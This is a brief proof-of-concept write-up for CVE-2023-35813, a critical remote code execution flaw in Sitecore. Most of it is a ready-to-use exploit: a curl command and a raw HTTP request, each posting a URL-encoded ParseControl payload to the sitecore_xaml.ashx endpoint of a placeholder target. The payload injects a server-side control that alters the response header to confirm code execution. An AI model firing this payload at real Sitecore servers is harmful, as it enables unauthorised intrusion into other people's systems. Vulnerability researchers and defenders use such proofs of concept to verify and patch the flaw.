CVE: 2023-35813
CVSS Score: 9.8
Severity: Critical 

Here we are going to give command like return HTTP header  response back like -

My Request -

content-type: admin

Response should be -

content-type: admin

Remote Code Execution 


#poc
- cmd 
`curl --data '__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl("%3C%25%40Register%0A%20%20%20%20%20%20%20%20TagPrefix%20%3D%20%27x%27%0A%20%20%20%20%20%20%20%20Namespace%20%3D%20%27System.Runtime.Remoting.Services%27%0A%20%20%20%20%20%20%20%20Assembly%20%3D%20%27System.Runtime.Remoting%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089%27%0A%20%20%20%20%25%3E%0A%20%20%20%20%3Cx%3ARemotingService%20runat%3D%27server%27%0A%20%20%20%20%20%20%20%20Context-Response-ContentType%3D%27kro%20the%20best%27%0A%20%20%20%20%2F%3E")'http:// <target> /sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index -v`


#poc
burp

POST /sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index HTTP/2
Host:  <target> 
Content-Type: application/x-www-form-urlencoded
Content-Length: xxx


__ISEVENT=1&__SOURCE=&__PARAMETERS=ParseControl("%3C%25%40Register%0A%20%20%20%20%20%20%20%20TagPrefix%20%3D%20%27x%27%0A%20%20%20%20%20%20%20%20Namespace%20%3D%20%27System.Runtime.Remoting.Services%27%0A%20%20%20%20%20%20%20%20Assembly%20%3D%20%27System.Runtime.Remoting%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089%27%0A%20%20%20%20%25%3E%0A%20%20%20%20%3Cx%3ARemotingService%20runat%3D%27server%27%0A%20%20%20%20%20%20%20%20Context-Response-ContentType%3D%27kro%20the%20best%27%0A%20%20%20%20%2F%3E
